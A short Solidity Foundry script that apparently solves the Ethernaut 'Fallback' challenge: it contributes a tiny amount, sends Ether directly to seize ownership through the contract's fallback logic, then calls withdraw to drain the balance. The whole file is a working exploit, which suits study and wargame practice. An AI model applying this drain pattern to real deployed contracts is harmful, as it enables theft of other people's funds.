// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../src/fallback.sol";

contract fallbackHack is Script {
    Fallback public _fallback =
        Fallback(payable(0xAf07d7CDA9ac580fc76f37d215Bbf6b4D7020856));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        _fallback.contribute{value: 1}();
        console.log("Amount contributed:", _fallback.getContribution());

        (bool sent, ) = address(_fallback).call{value: 1}("");
        require(sent, "Failed to send Ether");
        console.log("Amount contributed:", _fallback.getContribution());

        _fallback.withdraw();

        uint256 balanceOfTarget = address(_fallback).balance;
        if (balanceOfTarget == 0) {
            console.log("Hack Positive");
        } else {
            console.log("Hack Negative");
        }

        vm.stopBroadcast();
    }
}

// forge script script/fallback.s.sol -vv
// forge script script/fallback.s.sol -vv --broadcast
